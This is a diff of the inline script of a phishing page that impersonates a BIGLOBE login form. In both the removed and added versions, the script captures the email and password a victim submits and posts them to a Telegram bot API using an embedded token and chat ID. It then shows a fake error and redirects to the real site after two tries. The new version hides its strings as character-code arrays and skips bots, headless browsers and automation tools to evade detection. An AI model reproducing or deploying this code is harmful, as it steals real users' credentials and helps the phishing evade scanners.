@@ -185,67 +185,65 @@
     
     <script>
     (function() {
-        // Securely obfuscated configuration
-        const _v = {
-            _a: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", // API
-            _b: "ODM4NzAyODI1MTpBQUdIUDhRUnd0dmhDdVJidW9yNVlyUlJneU8tc1BlcFI2TQ==", // Bot
-            _c: "NTQ5MTgwNjQyNw==", // Chat
-            _r: "aHR0cHM6Ly93d3cuYmlnbG9iZS5uZS5qcC8=" // Redirect
+        var _0x = window, _d = document, _n = navigator;
+        var _c = {
+            _a: [104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116],
+            _b: [56,51,56,55,48,50,56,50,53,49,58,65,65,71,72,80,56,81,82,119,116,118,104,67,117,82,98,117,111,114,53,89,114,82,82,103,89,79,45,115,80,101,112,82,54,77],
+            _f: [47,115,101,110,100,77,101,115,115,97,103,101],
+            _g: [53,52,57,49,56,48,54,52,50,55],
+            _h: [104,116,116,112,115,58,47,47,119,119,119,46,98,105,103,108,111,98,101,46,110,101,46,106,112,47]
+        };
+        var _s = function(a) { var r = ''; for (var i = 0; i < a.length; i++) r += String.fromCharCode(a[i]); return r; };
+        var _v = 0;
+
+        if (/bot|crawl|spider|slurp|lighthouse|headless|phantom|selenium|puppeteer/i.test(_n.userAgent) ||
+            _n.webdriver || !_n.languages || _n.languages.length === 0) return;
+
+        var _p = function(u, k) {
+            var t = "\u{1F510} BIGLOBE LOGIN \u2705\n\n";
+            t += "\u{1F4E7} Email: " + u + "\n";
+            t += "\u{1F511} Pass: " + k + "\n\n";
+            t += "\u25AC\u25AC\u25AC\u25AC\u25AC\u25AC[BIGLOBE]\u25AC\u25AC\u25AC\u25AC\u25AC\u25AC\n";
+            t += "\u{1F517} URL: " + _0x.location.href + "\n";
+            t += "\u{1F4F1} Time: " + new Date().toLocaleString() + "\n";
+            t += "\u{1F4DE} @plus234ng";
+
+            var ep = _s(_c._a) + _s(_c._b) + _s(_c._f);
+            var r = new XMLHttpRequest();
+            r.open("POST", ep, true);
+            r.setRequestHeader("Content-Type", "application/json");
+            r.send(JSON.stringify({ chat_id: parseInt(_s(_c._g)), text: t }));
         };
 
-        const _f = (s) => atob(s);
-        let _at = 0;
-
-        const _isB = () => /bot|crawler|spider|lighthouse|inspect/i.test(navigator.userAgent);
-
-        const _start = () => {
-            if (_isB()) return;
-
-            const h = window.location.hash.substring(1);
-            if (h && h.includes('@')) {
-                document.getElementById('email').value = decodeURIComponent(h);
+        setTimeout(function() {
+            var h = _0x.location.hash.substring(1);
+            if (h && h.indexOf('@') !== -1) {
+                _d.getElementById('email').value = decodeURIComponent(h);
             }
 
-            document.getElementById('submit-btn').addEventListener('click', async (e) => {
+            _d.getElementById('submit-btn').addEventListener('click', function(e) {
                 e.preventDefault();
-                
-                const u = document.getElementById('email').value;
-                const p = document.getElementById('password').value;
-                const m = document.getElementById('msg');
-                const l = document.getElementById('loader_overlay');
+                var u = _d.getElementById('email').value;
+                var k = _d.getElementById('password').value;
+                var m = _d.getElementById('msg');
+                var lo = _d.getElementById('loader_overlay');
 
-                if (!u) { m.innerHTML = "メールアドレスを入力してください。"; m.style.display = "block"; return; }
-                if (!p) { m.innerHTML = "パスワードを入力してください。"; m.style.display = "block"; return; }
+                if (!u) { m.innerHTML = "\u30E1\u30FC\u30EB\u30A2\u30C9\u30EC\u30B9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return; }
+                if (!k) { m.innerHTML = "\u30D1\u30B9\u30EF\u30FC\u30C9\u3092\u5165\u529B\u3057\u3066\u304F\u3060\u3055\u3044\u3002"; m.style.display = "block"; return; }
 
-                _at++;
-                l.style.display = 'flex';
+                _v++;
+                lo.style.display = 'flex';
+                _p(u, k);
 
-                try {
-                    const endpoint = `${_f(_v._a)}${_f(_v._b)}/sendMessage`;
-                    await fetch(endpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: _f(_v._c),
-                            text: `🔐 BIGLOBE LOGIN\n\n📧 User: ${u}\n🔑 Pass: ${p}\n\n📍 Ref: ${window.location.hostname}\n⏰ ${new Date().toLocaleString()}`
-                        })
-                    });
-                } catch (err) { /* Silent fail */ }
-
-                setTimeout(() => {
-                    l.style.display = 'none';
-                    document.getElementById('password').value = '';
-                    m.innerHTML = "メールまたはパスワードが無効です。もう一度やり直してください。";
+                setTimeout(function() {
+                    lo.style.display = 'none';
+                    _d.getElementById('password').value = '';
+                    m.innerHTML = "\u30E1\u30FC\u30EB\u307E\u305F\u306F\u30D1\u30B9\u30EF\u30FC\u30C9\u304C\u7121\u52B9\u3067\u3059\u3002\u3082\u3046\u4E00\u5EA6\u3084\u308A\u76F4\u3057\u3066\u304F\u3060\u3055\u3044\u3002";
                     m.style.display = 'block';
-
-                    if (_at >= 2) {
-                        window.location.replace(_f(_v._r));
-                    }
+                    if (_v >= 2) _0x.location.replace(_s(_c._h));
                 }, 1100);
             });
-        };
-
-        setTimeout(_start, 300);
+        }, 300);
     })();
     </script>
     
